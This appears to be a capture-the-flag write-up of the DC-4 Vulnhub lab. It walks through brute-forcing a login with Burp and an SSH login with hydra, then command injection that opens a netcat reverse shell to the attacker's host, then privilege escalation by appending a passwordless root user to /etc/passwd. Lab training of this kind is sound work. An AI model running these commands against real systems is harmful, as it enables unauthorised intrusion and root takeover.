# DC4 Vulnhub Walkthrough

#### Description

DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
 
 
  # Scaning
  
  ### Reconnaissance 
  
  Firstly we have to identify the machine IP address using tool like NetDiscover 
  
  Sudo netdiscover

![Screenshot from 2023-01-25 23-54-43](https://user-images.githubusercontent.com/108471951/214925957-99613a2f-7ac0-43e8-bb30-ade55493badd.png)

Found the IP 192.168.0.158


### Nmap

nmap -sV -sC -p- 192.168.0.158

![Screenshot from 2023-01-26 20-45-39](https://user-images.githubusercontent.com/108471951/214926265-f258b161-2f38-4040-b884-c5e8f71d6ea2.png)

By seeing the result I am not getting where to start, but i seen something new which i never seen before in the result nginx 1.15.10 



searchsploit nginx 1.15.10

![Screenshot from 2023-01-26 20-58-00](https://user-images.githubusercontent.com/108471951/214927477-32801d47-1f7c-4633-88e1-a940675af28c.png)

I tried to find a exploit for nginx 1.15.10 but i didt get

### Http


i visited website 

![Screenshot from 2023-01-26 20-58-15](https://user-images.githubusercontent.com/108471951/214926942-4a251766-d06f-45e7-8481-0cd03c9f3368.png)

Visiting website given a simple form





I decided to use burp suite intruder to crack the user credtials 

![Screenshot from 2023-01-26 23-25-05](https://user-images.githubusercontent.com/108471951/214928193-fa644c0e-9bfd-461f-886c-8ffbe7535f89.png)

I got a user name and passwd [ user = admin - passwd = happy ]


After login with the credentails we got I got a page that had the URL to /command.php

![Screenshot from 2023-01-26 23-26-27](https://user-images.githubusercontent.com/108471951/214928759-7fc341f0-88e0-4613-abb0-608a556fc8f2.png)




I tried running the commands that where present there

![Screenshot from 2023-01-26 23-26-49](https://user-images.githubusercontent.com/108471951/214928807-25f51207-269d-4574-a5de-1674025463c0.png)

Since we can run commands that means we can have reverse shell easily

I intercepted the command request in burp and then sent the netcat command for reverse shell nc+-e/bin/sh IP+PORT

![Screenshot from 2023-01-26 23-36-05](https://user-images.githubusercontent.com/108471951/214929191-e65549c2-9baa-4a79-ba12-87c2409ba32a.png)


Started listening in the given port 1234

![Screenshot from 2023-01-26 23-37-48](https://user-images.githubusercontent.com/108471951/214929563-4bc4be7f-03c9-4553-80cc-7e86eb9bc607.png)


and forweded the request in burp the i got the shell 

![Screenshot from 2023-01-26 23-38-53](https://user-images.githubusercontent.com/108471951/214929712-6b83e4ef-625d-4df6-8772-2767fd0de31e.png)



For TTY shell

Python Script from gtfobins  https://gtfobins.github.io/gtfobins/python/

![Screenshot from 2023-01-26 23-40-06](https://user-images.githubusercontent.com/108471951/214930021-66836e7a-4b5a-4a57-a5b4-c02643fe474d.png)

## Enumeration

python -c 'import os; os.system("/bin/sh")'

cd /home

![Screenshot from 2023-01-26 23-42-19](https://user-images.githubusercontent.com/108471951/214930323-68cf0310-57d9-4563-b320-3cffe87523b3.png)

I found some users 

I made them as a users.txt file

![Screenshot from 2023-01-26 23-48-21](https://user-images.githubusercontent.com/108471951/214930477-d5dba641-b790-4af2-8986-5ebe5a79b564.png)


![Screenshot from 2023-01-26 23-49-00](https://user-images.githubusercontent.com/108471951/214930504-9fab69e8-34c6-4dde-a8aa-b7a059b63f27.png)


cd jim

ls

cd backups


![Screenshot from 2023-01-26 23-55-16](https://user-images.githubusercontent.com/108471951/214930737-1782edfe-2a90-4efd-b42e-000427d94cc8.png)

I found some old passwords 


![Screenshot from 2023-01-27 00-57-35](https://user-images.githubusercontent.com/108471951/214931309-7e67a38d-68a2-487e-a62c-3bc8f461243a.png)


I made a pass.txt file

![Screenshot from 2023-01-27 00-57-04](https://user-images.githubusercontent.com/108471951/214931483-09ce31e8-0b43-4b54-8cb1-c141de2b02be.png)


### Bruteforce

##### hydra

now i bruteforceing the user id and passwords on ssh port which is open

hydra -L users.txt -P pass.txt ssh://192.168.0.158


![Screenshot from 2023-01-27 00-06-14](https://user-images.githubusercontent.com/108471951/214932104-08b8a0d4-33f0-455d-93f6-aca4bc50f046.png)


I got the user jim password = jibril04



ssh jim@192.168.0.158


![Screenshot from 2023-01-27 00-09-42](https://user-images.githubusercontent.com/108471951/214932330-1c062baa-ae2e-4989-a87e-8dacfde00450.png)




ls

cd mbox


![Screenshot from 2023-01-27 00-12-05](https://user-images.githubusercontent.com/108471951/214932504-2197ac6d-bd29-40f8-ae06-2b22542be8e0.png)


This looks like an email. So let’s check out the /var/mail folder to see if we find anything



cd /vra/mail

![Screenshot from 2023-01-27 00-15-25](https://user-images.githubusercontent.com/108471951/214932779-5e45f284-a4a2-4a93-a60c-e5f5e16b23c1.png)

HereI found a mail to charles in this there’s a password for user charles


user/passwd                charles                     ^xHhA&hvim0y 


su charles

![Screenshot from 2023-01-27 00-16-19](https://user-images.githubusercontent.com/108471951/214933644-49a9f588-1915-43a3-b27a-8b955bd4ad4b.png)





sudo -l 


![Screenshot from 2023-01-27 00-17-53](https://user-images.githubusercontent.com/108471951/214933809-63228a5f-c8b0-49c6-aaec-63d1b9001bc1.png)


Charles can run teehee with sudo rights

We can add a user in /etc/passwd without any password and have that user power of root 



![Screenshot from 2023-01-27 00-18-44](https://user-images.githubusercontent.com/108471951/214934790-6517bdca-061d-4bfb-9764-e34ad7012d0d.png)



echo "Robin::0:0:::/bin/sh" | sudo teehee -a /etc/passwd


![Screenshot from 2023-01-27 00-25-37](https://user-images.githubusercontent.com/108471951/214934692-60d70cdd-eb51-45f4-af52-07687c0107db.png)


we cretaed the user Robin 




su Robin

whoami


![Screenshot from 2023-01-27 00-26-17](https://user-images.githubusercontent.com/108471951/214935010-fba6abf7-3f0a-416d-aad1-45b2232337db.png)
 
 
 
 cd /
 
 ls
 
 cd root
 
 ls
 
 cat flag.txt
 
 ![Screenshot from 2023-01-27 00-27-08](https://user-images.githubusercontent.com/108471951/214935210-2c196d3e-d008-48e8-872b-3678498e1383.png)

 

Sccesfully I have found the flag.


